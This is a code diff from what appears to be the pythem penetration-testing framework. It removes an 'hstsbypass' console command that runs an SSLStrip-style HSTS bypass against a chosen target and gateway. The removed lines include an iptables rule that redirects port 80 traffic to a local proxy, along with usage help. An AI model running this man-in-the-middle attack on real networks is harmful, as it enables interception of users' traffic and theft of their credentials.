@@ -121,39 +121,6 @@ class Processor(object):
 							set_ip_forwarding(0)
 						exit()
 
-						# HSTSBYPASS
-					elif self.command == "hstsbypass":
-						from pythem.modules.sslkill import Proxy,SSLKiller,SSLStripRequestHandler
-						def HSTSbypass():
-        		                        	sslkill = SSLKiller(self.interface, self.targets, self.gateway)
-        		                                Proxy(HandlerClass=SSLStripRequestHandler)
-						if self.targets and self.gateway and self.interface:
-							try:
-								self.sslkill_status = True
-                						os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
-								ht = threading.Thread(name='HSTSbypass', target=HSTSbypass)
-								ht.setDaemon(True)
-								ht.start()
-								sleep(5)
-								#print "[*] SSLKill initialized"
-								#print "      |_by: m4n3dw0lf"
-							except Exception as e:
-								print "[!] Exception caught: {}".format(e)
-
-						else:
-							print "[!] You need to set a target, interface and gateway before starting SSLKill."
-
-
-					elif self.command == "hstsbypass help":
-						print "\n[Help] Start to perform a HSTS Bypass with SSLKill"
-						print "[Required] Interface, Gateway and Target"
-						print "example:"
-						print "{} set interface eth0".format(console)
-						print "{} set gateway 10.0.0.1".format(console)
-						print "{} set target 10.0.0.3".format(console)
-						print "{} hstsbypass\n".format(console)
-
-
 					elif self.input_list[0] == "set" or self.input_list[0] == "SET":
 						try:
 							if self.input_list[1] == "interface":
